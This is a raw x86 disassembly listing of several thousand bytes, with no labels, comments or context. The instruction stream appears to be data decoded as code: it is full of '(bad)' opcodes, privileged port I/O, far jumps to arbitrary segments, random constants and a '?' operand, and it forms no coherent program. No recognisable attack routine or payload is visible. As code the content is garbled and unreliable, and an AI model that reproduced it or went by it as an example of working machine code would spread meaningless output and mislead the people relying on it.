  418ffa:	mov    eax,ds:0x279737f2
  418fff:	fmul   QWORD PTR [ecx+0x5bea0551]
  419005:	rol    DWORD PTR [eax+0x1b8e7dee],1
  41900b:	mov    cl,0xc8
  41900d:	retf   0xee51
  419010:	ret    0x8945
  419013:	out    0x36,al
  419015:	cld    
  419016:	mov    esp,0x766c87cd
  41901b:	mov    DWORD PTR ds:0xa5c8d3c,esi
  419021:	xor    DWORD PTR [eax],esp
  419023:	sahf   
  419024:	ins    DWORD PTR es:[edi],dx
  419025:	call   0xdbc6:0x922e72c7
  41902c:	pusha  
  41902d:	std    
  41902e:	push   es
  41902f:	mov    ds:0xd38efdb9,al
  419034:	and    eax,0x5ae744f9
  419039:	cmp    BYTE PTR ds:0x47ad87e3,al
  41903f:	pop    ss
  419040:	test   BYTE PTR [ebp+0x4009233b],0x21
  419047:	sbb    edi,esi
  419049:	jecxz  0x4190ca
  41904b:	and    BYTE PTR [ebx-0x4425e708],bl
  419051:	lds    edx,FWORD PTR [eax-0x3a]
  419054:	fdivr  DWORD PTR [ebp-0x65a3b51e]
  41905a:	bound  esp,QWORD PTR [eax-0x3]
  41905d:	cli    
  41905e:	push   esi
  41905f:	mov    ebx,DWORD PTR [ecx]
  419061:	mov    ds:0xdcf50f95,eax
  419066:	(bad)  
  419067:	mov    fs,WORD PTR [eax]
  419069:	push   ebp
  41906a:	lea    esi,[ecx+0x4f919a57]
  419070:	retf   
  419071:	stos   BYTE PTR es:[edi],al
  419072:	adc    bh,BYTE PTR ss:[ebx+eiz*8-0x176e907e]
  41907a:	daa    
  41907b:	sbb    edi,DWORD PTR [eax-0x65ddc942]
  419081:	jnp    0x419049
  419083:	or     eax,0x1d2e803d
  419088:	rep ins DWORD PTR es:[edi],dx
  41908a:	sbb    ecx,0x1c
  41908d:	pop    eax
  41908e:	jnp    0x41906e
  419090:	mov    dh,BYTE PTR [ebx]
  419092:	pop    edi
  419093:	adc    al,0x4a
  419095:	add    bh,BYTE PTR [ecx-0xa]
  419098:	add    dl,bl
  41909a:	ja     0x4190f2
  41909c:	les    bp,DWORD PTR [edi+0x2ad066d1]
  4190a3:	push   edi
  4190a4:	push   ebp
  4190a5:	and    cl,ch
  4190a7:	xchg   esp,eax
  4190a8:	clc    
  4190a9:	mov    bl,0x7d
  4190ab:	ds jp  0x41903e
  4190ae:	ja     0x419118
  4190b0:	pop    eax
  4190b1:	ins    BYTE PTR es:[edi],dx
  4190b2:	push   cs
  4190b3:	test   ah,ch
  4190b5:	fild   DWORD PTR [ebp-0x18]
  4190b8:	jbe    0x4190ae
  4190ba:	icebp  
  4190bb:	cmp    al,0x32
  4190bd:	mov    DWORD PTR [edx-0xa8e510a],esi
  4190c3:	std    
  4190c4:	dec    ebp
  4190c5:	jno    0x41904c
  4190c7:	pop    ds
  4190c8:	sbb    dh,bh
  4190ca:	cwde   
  4190cb:	inc    esp
  4190cc:	mov    ebx,0x7c7c795c
  4190d1:	gs pop edx
  4190d3:	pop    ecx
  4190d4:	dec    ebx
  4190d5:	imul   ecx,DWORD PTR [edx+0x33],0xffffffa2
  4190d9:	mov    ch,0xc4
  4190db:	mov    BYTE PTR [eax-0x75],dl
  4190de:	stos   BYTE PTR es:[edi],al
  4190df:	push   0x14
  4190e1:	jo     0x419116
  4190e3:	fldcw  WORD PTR [esp+eiz*4+0x55]
  4190e7:	imul   esi,DWORD PTR [edx-0x4a50fc1e],0x7d4fea33
  4190f1:	ss out 0x91,al
  4190f4:	and    DWORD PTR [ebx-0x1e],edi
  4190f7:	int    0xb4
  4190f9:	mov    ebp,0x62edcbdc
  4190fe:	clc    
  4190ff:	and    DWORD PTR [edx+0x7b],edi
  419102:	pop    ebp
  419103:	jle    0x41910d
  419105:	dec    ecx
  419106:	fdiv   st(3),st
  419108:	loopne 0x419155
  41910a:	dec    ebx
  41910b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41910c:	bt     DWORD PTR [ebp-0x7fd9f6e6],ebp
  419113:	rcl    DWORD PTR [edx],cl
  419115:	and    ah,al
  419117:	into   
  419118:	test   al,0xd2
  41911a:	jmp    0xa630670
  41911f:	cmp    DWORD PTR [eax-0x3d],edx
  419122:	inc    ecx
  419123:	mov    esp,0x39d1731f
  419128:	mov    WORD PTR [edi+0x1113542a],es
  41912e:	dec    edx
  41912f:	bound  esi,QWORD PTR [ebx]
  419131:	xor    BYTE PTR [esi],al
  419133:	cwde   
  419134:	cmc    
  419135:	add    edx,esp
  419137:	inc    edi
  419138:	dec    esp
  419139:	mov    eax,DWORD PTR [ebx+0x3eac6093]
  41913f:	aam    0xe1
  419141:	jno    0x419150
  419143:	adc    eax,0x8bee4e7d
  419148:	or     esp,eax
  41914a:	int    0x69
  41914c:	or     al,0x65
  41914e:	mov    dh,0x38
  419150:	hlt    
  419151:	inc    BYTE PTR ds:0x19c5c59e
  419157:	push   eax
  419158:	call   FWORD PTR [edx]
  41915a:	cmp    ebp,0xffffffd1
  41915d:	dec    eax
  41915e:	lea    ebp,[ecx]
  419160:	sahf   
  419161:	pop    ecx
  419162:	popf   
  419163:	mov    WORD PTR [ebx+0x26423286],?
  419169:	dec    esp
  41916a:	out    dx,eax
  41916b:	and    eax,0xccd21141
  419170:	stos   BYTE PTR es:[edi],al
  419171:	jnp    0x41916e
  419173:	or     ah,BYTE PTR [ebx+ebp*8-0x7e]
  419177:	push   ds
  419178:	mov    ds:0xc0a8dc,al
  41917d:	out    0x39,al
  41917f:	push   edx
  419180:	push   edx
  419181:	pop    es
  419182:	dec    edi
  419183:	mov    eax,0x730ce94d
  419188:	rcr    dl,1
  41918a:	dec    ebp
  41918b:	pusha  
  41918c:	xchg   ebx,eax
  41918d:	and    eax,0x8fa87aba
  419192:	stc    
  419193:	jmp    0x41912a
  419195:	xchg   BYTE PTR [ebx-0x56fe109b],al
  41919b:	xchg   esp,eax
  41919c:	out    0x89,eax
  41919e:	loop   0x419132
  4191a0:	jge    0x4191f7
  4191a2:	call   DWORD PTR [ecx+0x26]
  4191a5:	pop    ss
  4191a6:	or     al,0x6f
  4191a8:	mov    esp,0xe63cf355
  4191ad:	mov    fs,WORD PTR [eax]
  4191af:	es and al,0xdf
  4191b2:	pop    es
  4191b3:	loop   0x419234
  4191b5:	jge    0x4191ff
  4191b7:	in     al,dx
  4191b8:	ror    DWORD PTR [ebx],0x13
  4191bb:	dec    eax
  4191bc:	or     ebx,esp
  4191be:	out    dx,eax
  4191bf:	mov    DWORD PTR [eax-0x32690d04],eax
  4191c5:	pop    esp
  4191c6:	add    al,0xce
  4191c8:	xchg   esp,eax
  4191c9:	imul   ebp,eax,0x3d2a7566
  4191cf:	or     dh,cl
  4191d1:	call   0xb4c9fa99
  4191d6:	xor    eax,0x44862de6
  4191db:	out    0xf1,eax
  4191dd:	lds    ebx,FWORD PTR [esi+0x2a]
  4191e0:	add    eax,0x1a7ab527
  4191e5:	jl     0x4191cc
  4191e7:	ret    
  4191e8:	or     DWORD PTR [edi-0x59e457c1],0x76
  4191ef:	scas   al,BYTE PTR es:[edi]
  4191f0:	(bad)  
  4191f1:	cmc    
  4191f2:	lds    ebx,FWORD PTR [edx-0x5c]
  4191f5:	test   ecx,edi
  4191f7:	pop    esp
  4191f8:	hlt    
  4191f9:	ret    
  4191fa:	mov    esp,DWORD PTR [edx-0x73a902f]
  419200:	das    
  419201:	sub    ebp,DWORD PTR [edx+0x240a15a0]
  419207:	outs   dx,DWORD PTR ds:[esi]
  419208:	test   DWORD PTR [eax+0x3df076ac],0xccdbbcbf
  419212:	leave  
  419213:	fwait
  419214:	aad    0x54
  419216:	xlat   BYTE PTR ds:[ebx]
  419217:	push   ebp
  419218:	push   edx
  419219:	pop    esp
  41921a:	xchg   esp,eax
  41921b:	rol    BYTE PTR [edx],cl
  41921d:	lods   al,BYTE PTR ds:[esi]
  41921e:	xor    al,0x70
  419220:	adc    eax,0x72c045d8
  419225:	js     0x419295
  419227:	pushf  
  419228:	dec    esi
  419229:	fistp  DWORD PTR [ebx-0x30]
  41922c:	mov    ah,0x9b
  41922e:	daa    
  41922f:	addr16 pop esi
  419231:	jb     0x4191f1
  419233:	das    
  419234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419235:	jl     0x419251
  419237:	dec    edx
  419238:	sub    edx,DWORD PTR [esi+0x3e]
  41923b:	cdq    
  41923c:	mov    BYTE PTR [edi+0x2d2fc2a8],dl
  419242:	lea    eax,[esi-0x9]
  419245:	lods   eax,DWORD PTR ds:[esi]
  419246:	xchg   ebp,eax
  419247:	mov    bl,0x84
  419249:	stc    
  41924a:	test   ch,bh
  41924c:	cld    
  41924d:	dec    ebx
  41924e:	cs xchg ebx,eax
  419250:	bswap  eax
  419252:	(bad)  
  419253:	test   DWORD PTR [edx-0x1b0d9cd7],0x48389ddb
  41925d:	push   ds
  41925e:	fidiv  WORD PTR [eax]
  419260:	xchg   esi,eax
  419261:	jae    0x419208
  419263:	jmp    DWORD PTR [eax+0xb]
  419266:	loope  0x419242
  419268:	repz repz sub al,0x31
  41926c:	push   esp
  41926d:	xlat   BYTE PTR ds:[ebx]
  41926e:	fdivrp st(7),st
  419270:	loopne 0x419206
  419272:	int    0x94
  419274:	adc    al,0x42
  419276:	pop    ecx
  419277:	jg     0x41927e
  419279:	retf   0x42a3
  41927c:	mov    edi,0x52c65ac7
  419281:	jmp    0x5d316059
  419286:	ret    
  419287:	stc    
  419288:	(bad)  
  41928a:	repz jle 0x419214
  41928d:	xchg   DWORD PTR [esi],ebx
  41928f:	in     eax,0xb2
  419291:	int3   
  419292:	sbb    eax,DWORD PTR ds:0x523194ea
  419298:	rcr    BYTE PTR [ebx+eiz*8-0x714cc909],0x79
  4192a0:	mov    ebx,0x85a8ae07
  4192a5:	jmp    0x51b6:0xab1e01e0
  4192ac:	aad    0x3c
  4192ae:	dec    esp
  4192af:	scas   eax,DWORD PTR es:[edi]
  4192b0:	(bad)  
  4192b1:	xor    al,0x3b
  4192b3:	cmp    ebx,ecx
  4192b5:	push   edx
  4192b6:	mov    edi,0x64dc4055
  4192bb:	jge    0x419279
  4192bd:	das    
  4192be:	and    DWORD PTR [esi*2-0x702254d8],edx
  4192c5:	out    dx,al
  4192c6:	xor    ah,al
  4192c8:	xchg   ebp,eax
  4192c9:	xchg   ecx,eax
  4192ca:	jle    0x419347
  4192cc:	int    0x11
  4192ce:	or     dl,BYTE PTR [ebp-0xc]
  4192d1:	push   edi
  4192d2:	push   edx
  4192d3:	dec    DWORD PTR [edx+0x58bebba0]
  4192d9:	mov    al,ds:0x9d75fc43
  4192de:	popa   
  4192df:	push   ds
  4192e0:	push   edx
  4192e1:	jmp    0x988d:0x555b8359
  4192e8:	lahf   
  4192e9:	sbb    dh,BYTE PTR [ebp-0x192c533c]
  4192ef:	and    eax,0x1142d21c
  4192f4:	xor    eax,0x52723323
  4192f9:	add    al,BYTE PTR [eax-0x1d]
  4192fc:	fimul  WORD PTR [eax-0x294210f1]
  419302:	jecxz  0x4192bb
  419304:	pop    ebp
  419305:	bound  ebx,QWORD PTR [ebx-0x77]
  419308:	lods   al,BYTE PTR ds:[esi]
  419309:	jae    0x4192a5
  41930b:	jmp    0xfc1e5135
  419310:	cdq    
  419311:	pop    ss
  419312:	and    ebx,DWORD PTR [edi]
  419314:	sbb    edi,eax
  419316:	pusha  
  419317:	jl     0x419367
  419319:	sbb    eax,0x7f004925
  41931e:	inc    ebp
  41931f:	leave  
  419320:	pop    esp
  419321:	enter  0xf881,0x32
  419325:	rcr    cl,0x54
  419328:	mov    ch,dh
  41932a:	or     DWORD PTR [edi+eiz*2-0xa],ecx
  41932e:	mov    dh,0xb1
  419330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419331:	int    0xbe
  419333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419334:	mov    al,BYTE PTR [edi+0x16]
  419337:	adc    al,0x3
  419339:	pushf  
  41933a:	in     eax,dx
  41933b:	lods   al,BYTE PTR ds:[esi]
  41933c:	iret   
  41933d:	pop    esp
  41933e:	cli    
  41933f:	in     al,dx
  419340:	test   al,0x37
  419342:	(bad)  
  419343:	mov    ss,WORD PTR [ebp+0x722c84a3]
  419349:	sub    al,0x69
  41934b:	popa   
  41934c:	(bad)  
  41934d:	add    ch,BYTE PTR [edi+eiz*8-0x6e0ba7ea]
  419354:	aaa    
  419355:	jno    0x4193aa
  419357:	outs   dx,DWORD PTR ds:[esi]
  419358:	popf   
  419359:	lea    ebp,[ebp-0x23582ba1]
  41935f:	or     DWORD PTR [edx+0x4da0c9a5],eax
  419365:	(bad)  
  419369:	push   esi
  41936a:	mov    esp,0xd3409443
  41936f:	push   cs
  419370:	dec    esp
  419371:	mov    esi,edx
  419373:	fcomp  QWORD PTR [edx]
  419375:	add    bh,BYTE PTR [edi-0xa1e1d8b]
  41937b:	push   esp
  41937c:	cmp    BYTE PTR [edx+0x6a921404],dh
  419382:	aas    
  419383:	popa   
  419384:	fistp  QWORD PTR [edx]
  419386:	jmp    0xce6f0db8
  41938b:	jns    0x4193e7
  41938d:	jno    0x4193e7
  41938f:	retf   0x707c
  419392:	sub    bl,dl
  419394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419395:	nop
  419396:	xchg   ecx,eax
  419397:	mov    ss,WORD PTR [esi+esi*1-0x4a]
  41939b:	rcr    DWORD PTR [eax+0x16678d06],cl
  4193a1:	retf   
  4193a2:	retf   
  4193a3:	sub    BYTE PTR [ecx],bh
  4193a5:	daa    
  4193a6:	pusha  
  4193a7:	loope  0x41938e
  4193a9:	dec    edx
  4193aa:	push   0x5d9b9bff
  4193af:	xor    DWORD PTR [ebx-0x37],0x63e62bf1
  4193b6:	mov    edx,eax
  4193b8:	sar    BYTE PTR [edi+ebp*8-0x18],0x69
  4193bd:	dec    ecx
  4193be:	mov    ebp,0xdbd296b
  4193c3:	adc    BYTE PTR [ebx-0x396cb9fa],ah
  4193c9:	jmp    0xfc66:0xf54456db
  4193d0:	mov    esi,0xd58ea69
  4193d5:	das    
  4193d6:	lea    ecx,[ebp+0x31]
  4193d9:	cmp    BYTE PTR [edi],al
  4193db:	pop    ds
  4193dc:	dec    ebp
  4193dd:	or     al,0xd5
  4193df:	imul   esi,DWORD PTR [ebp+0x5b96c7fe],0xffffffb1
  4193e6:	cmp    edi,DWORD PTR [ecx+0x735a9e45]
  4193ec:	fnstenv [eax+0x66137599]
  4193f2:	cmc    
  4193f3:	loop   0x419441
  4193f5:	add    DWORD PTR [esi],ebx
  4193f7:	mov    bl,BYTE PTR [ebx-0x1c]
  4193fa:	es lahf 
  4193fc:	jecxz  0x4193dc
  4193fe:	mov    edx,0x672d74d7
  419403:	dec    eax
  419404:	push   es
  419405:	mov    ds:0xc0f6fc22,eax
  41940a:	mov    ebp,0x1e1023d6
  41940f:	mov    BYTE PTR [ebp+0x29],ah
  419412:	iret   
  419413:	dec    esp
  419414:	fisub  DWORD PTR [eax]
  419416:	loope  0x419448
  419418:	cmp    edi,DWORD PTR [ecx+0x6a0a11b3]
  41941e:	jmp    0x419400
  419420:	mov    ds:0xdea5e70b,al
  419425:	ds push es
  419427:	jns    0x4193f2
  419429:	xor    eax,edi
  41942b:	xor    edx,DWORD PTR [edi-0x3682057f]
  419431:	lods   al,BYTE PTR ds:[esi]
  419432:	mov    edx,ebx
  419434:	ret    0x150e
  419437:	push   edi
  419438:	adc    bl,BYTE PTR gs:[ebp+0x41]
  41943c:	mov    eax,0x234a1781
  419441:	pop    ebp
  419442:	xchg   bl,bh
  419444:	push   ebx
  419445:	lods   eax,DWORD PTR ds:[esi]
  419446:	xchg   edx,eax
  419447:	and    cl,BYTE PTR [ebp+0x6c]
  41944a:	cwde   
  41944b:	mov    bh,0xf5
  41944d:	cwde   
  41944e:	and    eax,0xf4495b86
  419453:	fstp   DWORD PTR [edi]
  419455:	ins    DWORD PTR es:[edi],dx
  419456:	lods   al,BYTE PTR ds:[esi]
  419457:	xor    eax,0xa728c3d9
  41945c:	scas   eax,DWORD PTR es:[edi]
  41945d:	dec    eax
  41945e:	xchg   edx,eax
  41945f:	leave  
  419460:	imul   esi,DWORD PTR [eax+0x3e515d4b],0x76
  419467:	daa    
  419468:	sbb    eax,DWORD PTR [ecx+0x16e10157]
  41946e:	mov    bl,0x29
  419470:	cli    
  419471:	ret    0xaf3b
  419474:	repz int3 
  419476:	push   ds
  419477:	das    
  419478:	sbb    al,0xe0
  41947a:	mov    bh,0xb7
  41947c:	mov    esi,eax
  41947e:	ins    BYTE PTR es:[edi],dx
  41947f:	stos   BYTE PTR es:[edi],al
  419480:	enter  0x4709,0xad
  419484:	repz push 0x3b
  419487:	jns    0x4194dc
  419489:	ins    BYTE PTR es:[edi],dx
  41948a:	add    BYTE PTR [edx-0x164faaa4],cl
  419490:	mov    cl,0xe6
  419492:	push   ss
  419493:	jp     0x4194cc
  419495:	add    al,al
  419497:	(bad)  
  419498:	stos   DWORD PTR es:[edi],eax
  419499:	retf   
  41949a:	jle    0x4194a5
  41949c:	repnz lods eax,DWORD PTR ds:[esi]
  41949e:	sbb    BYTE PTR [edi+0xd],dl
  4194a1:	cmp    esi,esi
  4194a3:	test   al,0xa1
  4194a5:	dec    BYTE PTR ds:0x89bc90fa
  4194ab:	push   0x68409549
  4194b0:	pop    ebp
  4194b1:	mov    ecx,0x73ea3f7e
  4194b6:	dec    ebx
  4194b7:	repz adc bl,BYTE PTR [eax+0x5470e26c]
  4194be:	add    ebx,DWORD PTR [ebx+0x35c5457c]
  4194c4:	xor    dl,BYTE PTR [ecx]
  4194c6:	push   cs
  4194c7:	sub    ch,BYTE PTR [esi]
  4194c9:	(bad)  
  4194cb:	mov    ds:0xa9e815bf,eax
  4194d0:	ds or  al,0x1b
  4194d3:	jns    0x419466
  4194d5:	adc    ch,BYTE PTR [ebx-0x2f]
  4194d8:	jnp    0x4194cc
  4194da:	jno    0x41953c
  4194dc:	unpcklps xmm6,xmm7
  4194df:	repz dec esi
  4194e1:	mov    ah,0xe4
  4194e3:	add    al,0xab
  4194e5:	mov    ebp,0xfee29677
  4194ea:	popf   
  4194eb:	test   BYTE PTR [ecx+ebx*1],cl
  4194ee:	push   cs
  4194ef:	ins    BYTE PTR es:[edi],dx
  4194f0:	pop    ebp
  4194f1:	xchg   esp,eax
  4194f2:	inc    esp
  4194f3:	retf   0x71f0
  4194f6:	cwde   
  4194f7:	data16 or BYTE PTR [ecx-0x22],bh
  4194fb:	stc    
  4194fc:	adc    cl,BYTE PTR [edx-0x1af0a21d]
  419502:	and    eax,0x6970ebe6
  419507:	or     eax,DWORD PTR [edx]
  419509:	aad    0x2a
  41950b:	es sahf 
  41950d:	dec    esp
  41950e:	loopne 0x419546
  419510:	jge    0x419494
  419512:	outs   dx,DWORD PTR ds:[esi]
  419513:	adc    DWORD PTR [esi],ebx
  419515:	sbb    edi,DWORD PTR [ebx-0x42]
  419518:	cmc    
  419519:	cmp    eax,0x2af5dc0c
  41951e:	jmp    0x6fe571b8
  419523:	pop    ebx
  419524:	shl    DWORD PTR [edx+0x1c],0x65
  419528:	mov    esp,DWORD PTR [ecx+0x67]
  41952b:	push   ss
  41952c:	cld    
  41952d:	push   esi
  41952e:	dec    edi
  41952f:	dec    eax
  419530:	mov    ah,0x0
  419532:	mov    DWORD PTR [eax],ecx
  419534:	jecxz  0x41953b
  419536:	mov    DWORD PTR [edx+0x2a0b7830],ecx
  41953c:	sbb    esp,DWORD PTR [ecx]
  41953e:	push   eax
  41953f:	mov    edi,0x56324464
  419544:	(bad)  
  419546:	sbb    bh,BYTE PTR [ecx]
  419548:	push   ecx
  419549:	bound  eax,QWORD PTR [eax+0x30154e9c]
  41954f:	jo     0x419587
  419551:	scas   eax,DWORD PTR es:[edi]
  419552:	lahf   
  419553:	jl     0x41953f
  419555:	iret   
  419556:	std    
  419557:	test   BYTE PTR [eax-0x18],bl
  41955a:	pop    edx
  41955b:	or     ch,BYTE PTR [ecx+0x5a3368d9]
  419561:	mov    al,0x83
  419563:	adc    ch,dh
  419565:	mov    dl,0x86
  419567:	add    eax,DWORD PTR [ebx-0x2a092104]
  41956d:	mov    ds:0x7b1097bc,al
  419572:	hlt    
  419573:	loopne 0x419568
  419575:	push   edx
  419576:	retf   
  419577:	(bad)  
  419578:	popa   
  419579:	dec    DWORD PTR [esi+0x6e]
  41957c:	add    DWORD PTR [edx+eiz*8+0x79],esp
  419580:	pushf  
  419581:	test   eax,0x266b4128
  419586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419587:	in     eax,0x1
  419589:	shl    BYTE PTR [eax-0x11],1
  41958c:	cmp    al,0x92
  41958e:	or     al,0xf2
  419590:	mov    ebp,0x8317c4f2
  419595:	mov    BYTE PTR ds:0x9bdbb202,dl
  41959b:	jl     0x41956f
  41959d:	call   0xa4a2:0xb250ac63
  4195a4:	les    esi,FWORD PTR ds:0x9132b9da
  4195aa:	inc    esi
  4195ab:	fdivr  st(5),st
  4195ad:	jmp    0x419576
  4195af:	add    eax,DWORD PTR [esi+ecx*2-0x2651dd01]
  4195b6:	jne    0x41960a
  4195b8:	fst    QWORD PTR [edx-0x7a5fc41e]
  4195be:	jbe    0x41960c
  4195c0:	xchg   esp,eax
  4195c1:	fiadd  WORD PTR [ebp+0x6ace8660]
  4195c7:	push   0x99485375
  4195cc:	xor    BYTE PTR [edi],dl
  4195ce:	jo     0x419570
  4195d0:	mov    eax,ds:0x45daac30
  4195d5:	mov    bh,dl
  4195d7:	outs   dx,BYTE PTR ds:[esi]
  4195d8:	lods   al,BYTE PTR ds:[esi]
  4195d9:	lock fs mov esp,0x26d52656
  4195e0:	xor    dh,BYTE PTR [esi*8+0x1bee3f32]
  4195e7:	outs   dx,BYTE PTR ds:[esi]
  4195e8:	pop    ebp
  4195e9:	fdiv   st,st(2)
  4195eb:	cmp    edi,esp
  4195ed:	neg    BYTE PTR [edx+esi*4-0x4a7a6f81]
  4195f4:	arpl   WORD PTR [edi-0xa],bx
  4195f7:	test   DWORD PTR [esi+0x25],esi
  4195fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195fc:	test   al,0x96
  4195fe:	mov    DWORD PTR [ecx-0x45d9f785],ebp
  419604:	(bad)  [esp+esi*1+0x6d6a8f9f]
  41960b:	bts    DWORD PTR [esi+0x10f51596],ecx
  419612:	xor    esi,esi
  419614:	repnz cmp ecx,ebx
  419617:	add    cl,bh
  419619:	mov    ds:0x2d8a25e6,al
  41961e:	cmc    
  41961f:	xchg   ebx,eax
  419620:	mov    ds:0x27e014dd,eax
  419625:	push   0x68
  419627:	repnz mov dl,BYTE PTR [edi]
  41962a:	std    
  41962b:	ins    DWORD PTR es:[edi],dx
  41962c:	test   al,0xc8
  41962e:	cmp    bh,BYTE PTR [ecx-0x3f0814e3]
  419634:	jecxz  0x41968c
  419636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419637:	xor    eax,0x5b6c8c13
  41963c:	ins    BYTE PTR es:[edi],dx
  41963d:	loop   0x419615
  41963f:	or     eax,0xbce1876f
  419644:	pop    ecx
  419645:	mov    edx,0x85289f28
  41964a:	mov    edx,0x4cb7fdeb
  41964f:	ds jl  0x419674
  419652:	xor    dl,BYTE PTR [edi+0x67603245]
  419658:	test   BYTE PTR [esi],cl
  41965a:	fwait
  41965b:	jg     0x4196ab
  41965d:	and    BYTE PTR [edi+0x41],bl
  419660:	xchg   esp,eax
  419661:	shr    DWORD PTR [ebx+0x54],1
  419664:	mov    dl,BYTE PTR [ecx]
  419666:	xor    bl,bh
  419668:	(bad)  
  419669:	es in  eax,dx
  41966b:	aam    0xac
  41966d:	(bad)  
  41966e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41966f:	or     bh,bl
  419671:	push   cs
  419672:	bound  eax,QWORD PTR [eax-0x2b9a76f2]
  419678:	std    
  419679:	test   DWORD PTR [ecx-0x64],ebx
  41967c:	push   edi
  41967d:	add    ecx,DWORD PTR [esi]
  41967f:	xlat   BYTE PTR ds:[ebx]
  419680:	xchg   ebp,eax
  419681:	sbb    eax,0xeae8ff8c
  419686:	inc    esi
  419687:	push   ecx
  419688:	cmc    
  419689:	mov    edx,ebx
  41968b:	and    dh,ah
  41968d:	sbb    al,0x19
  41968f:	cmc    
  419690:	addr16 adc al,0x89
  419693:	jne    0x4196f9
  419695:	push   ecx
  419696:	or     edx,edi
  419698:	fsubr  st,st(7)
  41969a:	push   ebx
  41969b:	and    al,0xb
  41969d:	jecxz  0x419650
  41969f:	fwait
  4196a0:	dec    edi
  4196a1:	jecxz  0x4196f8
  4196a3:	fs pop es
  4196a5:	xchg   esp,eax
  4196a6:	arpl   WORD PTR [eax],sp
  4196a8:	sbb    al,0x68
  4196aa:	dec    ebx
  4196ab:	mov    esp,0x29943e84
  4196b0:	inc    eax
  4196b1:	xor    DWORD PTR [di+0x10b9],edi
  4196b6:	dec    esp
  4196b7:	jp     0x419737
  4196b9:	inc    ebx
  4196ba:	mov    edi,DWORD PTR [ebx+0x4d]
  4196bd:	push   esp
  4196be:	mov    al,ds:0x32314d0f
  4196c3:	mov    esp,0x7fb09c2b
  4196c8:	gs cwde 
  4196ca:	xchg   BYTE PTR [edx-0x1af66c0e],ch
  4196d0:	push   edx
  4196d1:	push   esp
  4196d2:	mov    esi,0x2f8cffed
  4196d7:	jo     0x4196d3
  4196d9:	pop    ds
  4196da:	xchg   ebp,eax
  4196db:	jmp    0x476198fc
  4196e0:	shr    DWORD PTR [esi+0xe1374f3],cl
  4196e6:	jmp    0x5ce53b54
  4196eb:	pop    ss
  4196ec:	and    eax,0x8f0cb2b0
  4196f1:	rcl    BYTE PTR [eax+0x5c],cl
  4196f4:	iret   
  4196f5:	leave  
  4196f6:	mov    al,ds:0x9afcd84
  4196fb:	mov    WORD PTR [edx],ds
  4196fd:	jns    0x4196c2
  4196ff:	push   ecx
  419700:	loopne 0x4196af
  419702:	xchg   esi,eax
  419703:	dec    ecx
  419704:	movhps xmm6,QWORD PTR [edx]
  419707:	push   0xc
  419709:	into   
  41970a:	sbb    cl,BYTE PTR [ebp+0x347d778d]
  419710:	pop    ebx
  419711:	lods   al,BYTE PTR ds:[esi]
  419712:	stc    
  419713:	mov    esp,0x8fce47fe
  419718:	pop    ds
  419719:	add    al,0xa3
  41971b:	dec    ebx
  41971c:	cmp    eax,0x5f49de80
  419721:	shl    ebp,0xb1
  419724:	add    eax,0xc8f0293f
  419729:	and    ecx,DWORD PTR [eax]
  41972b:	out    0xa6,eax
  41972d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41972e:	cld    
  41972f:	sar    ebx,1
  419731:	clc    
  419732:	mov    bl,0x73
  419734:	lahf   
  419735:	pop    edx
  419736:	cdq    
  419737:	cwde   
  419738:	call   0x9a23effc
  41973d:	mov    dh,0x42
  41973f:	pop    es
  419740:	jle    0x4196ea
  419742:	and    ch,BYTE PTR [edx-0x35d94e15]
  419748:	ds pop ecx
  41974a:	inc    edi
  41974b:	add    al,0xe2
  41974d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41974e:	adc    eax,DWORD PTR [eax+0x11fa6206]
  419754:	add    DWORD PTR [edx],ebx
  419756:	call   FWORD PTR [esi]
  419758:	sbb    BYTE PTR [edx+0x3a],dh
  41975b:	pop    edx
  41975c:	pop    edi
  41975d:	dec    edi
  41975e:	jge    0x419783
  419760:	push   es
  419761:	xchg   edx,eax
  419762:	mov    al,0x22
  419764:	call   0xb225:0x9697ed21
  41976b:	pop    es
  41976c:	or     ch,ch
  41976e:	jns    0x4197a5
  419770:	iret   
  419771:	xor    BYTE PTR [edx-0x63e8d591],bl
  419777:	test   BYTE PTR [edi+0x1baee1c],ah
  41977d:	stos   DWORD PTR es:[edi],eax
  41977e:	pop    ds
  41977f:	test   al,0x4a
  419781:	xchg   esi,eax
  419782:	mov    cs,WORD PTR ds:0x6013af6e
  419788:	sub    BYTE PTR [ebx+0x36],bl
  41978b:	xchg   edx,eax
  41978c:	shr    BYTE PTR [edi-0x59],cl
  41978f:	call   0xe7f4e59d
  419794:	jb     0x419794
  419796:	dec    eax
  419797:	pop    esp
  419798:	xchg   esi,eax
  419799:	jecxz  0x41972c
  41979b:	jb     0x419755
  41979d:	pop    edi
  41979e:	xor    eax,0xd57fb04
  4197a3:	jb     0x419813
  4197a5:	aaa    
  4197a6:	cmp    ecx,DWORD PTR ds:[ecx-0x47]
  4197aa:	fiadd  DWORD PTR [esi+0x41e3cfc0]
  4197b0:	out    0x1,eax
  4197b2:	fisttp DWORD PTR [si-0x7d]
  4197b6:	xchg   edi,eax
  4197b7:	rcl    BYTE PTR [esi+0x70],cl
  4197ba:	retf   0x7304
  4197bd:	inc    esp
  4197be:	xchg   edx,eax
  4197bf:	out    0xac,eax
  4197c1:	jp     0x4197b0
  4197c3:	call   0x3ceb7fd5
  4197c8:	adc    BYTE PTR [ebx+esi*8],cl
  4197cb:	lea    esi,ds:[esi-0x52]
  4197cf:	push   es
  4197d0:	dec    ebx
  4197d1:	xchg   ebx,eax
  4197d2:	jmp    0x5eaf:0x2cc16c1f
  4197d9:	add    DWORD PTR [ebp+0x47],edi
  4197dc:	out    dx,al
  4197dd:	push   ecx
  4197de:	je     0x4197fb
  4197e0:	or     cl,BYTE PTR [edx-0x79]
  4197e3:	cpuid  
  4197e5:	mov    esi,0xf806fbd
  4197ea:	push   0xfa1c68d
  4197ef:	lock lods al,BYTE PTR ds:[esi]
  4197f1:	sub    eax,0xbe3e08e2
  4197f6:	dec    edx
  4197f7:	cmp    bh,dh
  4197f9:	mov    ch,0xa2
